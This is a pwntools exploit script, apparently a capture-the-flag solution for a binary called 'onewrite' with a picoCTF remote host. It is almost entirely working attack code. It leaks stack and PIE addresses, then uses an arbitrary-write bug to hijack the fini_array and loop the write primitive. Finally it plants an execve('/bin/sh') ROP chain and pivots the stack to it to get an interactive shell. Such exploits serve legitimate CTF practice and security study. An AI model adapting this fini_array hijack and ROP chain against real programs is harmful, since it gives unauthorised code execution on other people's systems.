#!/usr/bin/env python3
import sys
from pwn import *
context.log_level="debug"
import time
import os
#-----------------------------------------------------------
'''
checksec checks
NX ENABLED - NO SHELLCODE ON THE STACK CAN BE EXECUTED 
PIE ENABLED - THE POSITION KEEPS CHANGING IN THE CODE (POSITION INDEPENDENT EXECUTABLE)
PARTIAL RELRO- CAN READ ONLY A FEW BYTES ALTHOUGH NOT THAT IMPORTANT
#calling conventions
 RDI,RSI,RDX,RCX,R8,R7 ...
'''
#============================#============================#============================
gdb_script='''
'''

path="./onewrite"
def check():
	log.warning(os.system(f'file {path}'))
	log.warning(os.system(f'checksec {path}'))
	log.warning(os.system(f'ldd {path}'))

if os.path.exists("./flag.txt")==False:
	with open("flag.txt","w") as flag:
		flag.write("flag{pwned_m0T******}")
elf = context.binary=ELF(path,checksec=True)
HOST="saturn.picoctf.net"
PORT= 50266
context.binary = elf
p=process(path)
argument=sys.argv[1]
if argument=="l":
    p=process(path)
if argument=="r":
	p=remote(HOST,PORT)
if argument=='g':
	p=process(path)
	gdb.attach(p,gdbscript=gdb_script)


#+++++++++++++++++++++++++++++++++++++++++++++++++ ++++++++++++++++++++++++++++++++++
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.strip().ljust(4, b'\0'))
uu64    = lambda data               :u64(data.strip().ljust(8, b'\0'))
ia 		= lambda 					: p.interactive()
rl 		= lambda 					: p.recvline()
#=======================================================================================
def leak(opt):
    p.recvuntil('>')
    p.sendline(str(opt))
    leak = p.recvline()
    leak = int(leak, 16)
    return leak
def write(adr, val, other = 0):
    p.recvuntil('address :')
    p.send(str(adr))
    p.recvuntil('data :')
    if other == 0:
        p.send(p64(val))
    else:
        p.send(val)
stack_leak=leak(1)
log.warning(f"{hex(stack_leak)}")
ripadr=stack_leak+0x18
write(ripadr,p8(0x04),1)
pie_leak=leak(2)
log.warning(f"{hex(pie_leak)}")
piebase=pie_leak-elf.symbols.do_leak
log.warning(f"{hex(piebase)}")
csiRipAdr = stack_leak - 72
finiarrtable=piebase +elf.symbols['__do_global_dtors_aux_fini_array_entry']
csufini=piebase + elf.symbols['__libc_csu_fini']
do_overwrite=piebase + elf.symbols['do_overwrite']
write(ripadr,p8(0x04), 1)
leak(1)
write(finiarrtable+8,do_overwrite)
write(finiarrtable,do_overwrite)
write(csiRipAdr, csufini)

csiRipAdr+=0x8


#gadgets

popRdi = piebase + 0x84fa
popRsi = piebase + 0xd9f2
popRdx = piebase + 0x484c5
popRax = piebase + 0x460ac
syscall = piebase + 0x917c
binsh 	= pie_leak + 0x2aa99b
pivotGadget = piebase + 0x106f3

def writeqword(addr,val):
	global csiRipAdr
	write(addr,val)
	write(csiRipAdr,csufini)
	csiRipAdr+=0x8
writeqword(binsh, u64("/bin/sh\x00"))
writeqword(stack_leak+0xd0,popRdi)
writeqword(stack_leak + 0xd8, binsh)
writeqword(stack_leak + 0xe0, popRsi)
writeqword(stack_leak + 0xe8, 0)
writeqword(stack_leak + 0xf0, popRdx)
writeqword(stack_leak + 0xf8, 0)
writeqword(stack_leak + 0x100, popRax)
writeqword(stack_leak + 0x108, 59)
writeqword(stack_leak + 0x110, syscall)

write(stack_leak - 0x10, pivotGadget)
ia()